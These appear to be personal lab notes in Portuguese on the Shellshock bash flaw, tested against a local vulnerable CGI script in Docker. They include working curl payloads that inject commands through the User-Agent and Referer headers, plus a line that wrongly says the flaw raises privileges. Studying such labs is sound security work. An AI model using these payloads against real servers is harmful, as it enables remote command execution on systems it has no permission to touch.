
Abrir um bash no contentor:
    docker exec -it shellshock /bin/bash

Para executar commandos com o curl ambos funcionam:
    
    curl -A "() { :; }; echo; echo; /bin/bash -c 'COMANDO'" http://localhost:8080/cgi-bin/vul.cgi
    
    curl -e "(){:;};echo;echo;/bin/bash -c 'touch ../../tmp/2NOVA'" http://localhost:8080/cgi-bin/vul.cgi

(echo; echo; é opcional é só para ver o output melhor)
O requisito é que esta parte do header seja transformada numa "Variável de ambiente" 
para que o bash quando ler a variavel HTTP_USER_AGENT= "() { :; }; ..." interprete como uma função

É possivel descobrir o conteudo do ficheiro /etc/passwd mas não do /etc/shadow porque apenas o root consegue
ler o ficheiro /etc/shadow e esta vunerabilidade permite executar comandos mas eleva as permissões do utilizador que as executa.

HTTP GET com ? poderia ser usado para a mesma vunerabilidade porque o resultado da query é guardado na variavel de ambiente QUERY_STRING,
mas a maneira como o browser codifica a string e a maneira como o server a descodifica porque pode modificar os comandos enviados no
na string fazendo com que os comandos não sejam executados.
(TBC não consegui usar este método através do browser ou do curl mas o Chatgpt diz que é possivel, secalhar pelo postman é possivel)

